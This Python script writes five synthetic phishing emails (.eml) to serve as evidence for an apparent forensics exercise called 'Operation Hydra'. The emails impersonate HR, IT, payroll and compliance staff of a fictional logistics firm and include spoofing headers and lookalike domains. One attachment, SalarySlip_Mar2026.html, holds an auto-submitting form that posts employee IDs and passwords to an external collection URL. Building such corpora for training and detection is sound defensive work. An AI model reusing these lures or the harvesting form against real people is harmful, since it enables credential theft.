#!/usr/bin/env python3
"""Generate the synthetic phishing corpus (.eml files) for Operation Hydra.

Re-running this overwrites evidence/phishing/*.eml with identical content,
so every analysis stays deterministic.

Writes: evidence/phishing/hydra01.eml ... hydra05.eml
"""
from __future__ import annotations

import os

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
OUT = os.path.join(ROOT, "evidence", "phishing")

SAMPLES = {
    "hydra01.eml": """Received: from mail.hydrapey.net (45.142.213.107) by mx.auroralogistics.in with ESMTPS id 8f2a91c4
Received-SPF: fail (domain owner discourages this sender) client-ip=45.142.213.107;
Authentication-Results: mx.auroralogistics.in; spf=fail smtp.mailfrom=auroralogistics.in; dkim=none; dmarc=fail (p=none, disposition=none)
X-Mailer: PHPMailer 6.8.0
Reply-To: hr.verify@aurora-hrportal.net
From: Aurora HR <hr@auroralogistics.in>
To: priya.nair@auroralogistics.in
Date: Sat, 14 Mar 2026 09:12:04 +0530
Subject: Urgent: Pilot Leave Roster - action needed by 15:00 IST
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8

<html><body>
<p>Dear Priya,</p>
<p>The pilot leave roster for March has been finalised. Kindly confirm your slots on the new
HR portal before 15:00 IST today to avoid payroll hold.</p>
<p><a href="http://aurora-hrportal.net/login?u=priya.nair@auroralogistics.in">Confirm on HR Portal</a></p>
<p>Regards,<br/>Aurora HR Team</p>
</body></html>
""",
    "hydra02.eml": """Received: from mail.hydrapey.net (45.142.213.107) by mx.auroralogistics.in with ESMTPS id 8f2b77d1
Received-SPF: fail (domain owner discourages this sender) client-ip=45.142.213.107;
Authentication-Results: mx.auroralogistics.in; spf=fail smtp.mailfrom=auroralogistics-support.com; dkim=none; dmarc=none
X-Mailer: PHPMailer 6.8.0
Reply-To: support.verify@auroralogistics-support.com
From: IT Helpdesk <support@auroralogistics-support.com>
To: v.rao@auroralogistics.in
Date: Sat, 14 Mar 2026 09:12:11 +0530
Subject: Password expires in 24h - reset now
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8

<html><body>
<p>Your domain password expires in 24 hours. Reset immediately via the SSO portal:</p>
<p><a href="https://auroralogistics-support.com/sso/reset?u=v.rao@auroralogistics.in">Reset password</a></p>
<p>If you do not reset, your account will be locked at 09:00 IST, 15 Mar.</p>
<p>IT Helpdesk, Aurora Logistics</p>
</body></html>
""",
    "hydra03.eml": """Received: from mail.hydrapey.net (45.142.213.107) by mx.auroralogistics.in with ESMTPS id 8f2c33e8
Received-SPF: fail (domain owner discourages this sender) client-ip=45.142.213.107;
Authentication-Results: mx.auroralogistics.in; spf=fail smtp.mailfrom=auroralogistics.in; dkim=none; dmarc=fail (p=none)
X-Mailer: PHPMailer 6.8.0
Reply-To: payroll.verify@aurora-hrportal.net
From: Payroll Team <payroll@auroralogistics.in>
To: r.desai@auroralogistics.in
Date: Sat, 14 Mar 2026 09:12:19 +0530
Subject: Revised salary slip - Mar 2026
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="hydra-b-3311"

--hydra-b-3311
Content-Type: text/html; charset=UTF-8

<p>Dear Rohan,</p>
<p>Your March salary slip has been revised after the payroll correction. Review and e-sign here:</p>
<p><a href="http://aurora-hrportal.net/payslip?u=r.desai@auroralogistics.in">View revised slip</a></p>
--hydra-b-3311
Content-Type: text/html; name="SalarySlip_Mar2026.html"
Content-Disposition: attachment; filename="SalarySlip_Mar2026.html"

<html><body onload="document.getElementById('f').submit()">
<form id="f" method="POST" action="http://aurora-hrportal.net/collect">
Employee ID: <input name="empid"/><br/>Password: <input name="pw" type="password"/><br/>
<input type="submit" value="View slip"/>
</form></body></html>
--hydra-b-3311--
""",
    "hydra04.eml": """Received: from mail.hydrapey.net (45.142.213.107) by mx.auroralogistics.in with ESMTPS id 8f2d19aa
Received-SPF: fail (domain owner discourages this sender) client-ip=45.142.213.107;
Authentication-Results: mx.auroralogistics.in; spf=fail smtp.mailfrom=auroralogistics.in; dkim=none; dmarc=fail (p=none)
X-Mailer: PHPMailer 6.8.0
Reply-To: travel.verify@aurora-hrportal.net
From: Travel Desk <travel@auroralogistics.in>
To: a.mehta@auroralogistics.in
Date: Sat, 14 Mar 2026 09:12:27 +0530
Subject: Pilot duty change - confirm within 2h
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8

<html><body>
<p>Your duty roster changed on 13 Mar. Confirm acceptance within 2 hours:</p>
<p><a href="https://bit.ly/3hydraX">Confirm duty change</a></p>
<p><span style="font-size:9px;color:#888">link resolves to aurora-hrportal.net/duty</span></p>
<p>Travel Desk, Aurora Logistics</p>
</body></html>
""",
    "hydra05.eml": """Received: from mail.hydrapey.net (45.142.213.107) by mx.auroralogistics.in with ESMTPS id 8f2e071b
Received-SPF: fail (domain owner discourages this sender) client-ip=45.142.213.107;
Authentication-Results: mx.auroralogistics.in; spf=fail smtp.mailfrom=auroralogistics.in; dkim=none; dmarc=fail (p=none)
X-Mailer: PHPMailer 6.8.0
Reply-To: kyc.verify@auroralogistics-support.com
From: Nodal Officer <compliance@auroralogistics.in>
To: finance@auroralogistics.in
Date: Sat, 14 Mar 2026 09:12:35 +0530
Subject: KYC re-verification before 31 Mar - mandatory
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8

<html><body>
<p>As per RBI mandate, vendor and payroll KYC must be re-verified before 31 Mar 2026.</p>
<p><a href="https://auroralogistics-support.com/kyc?org=AuroraLogistics">Complete KYC</a></p>
<p>Non-compliance will pause all vendor payments.</p>
<p>Nodal Officer, Aurora Logistics</p>
</body></html>
""",
}


def main() -> None:
    os.makedirs(OUT, exist_ok=True)
    for name, content in SAMPLES.items():
        with open(os.path.join(OUT, name), "w", encoding="utf-8", newline="\n") as fh:
            fh.write(content)
        print(f"wrote {name} ({len(content)} bytes)")


if __name__ == "__main__":
    main()
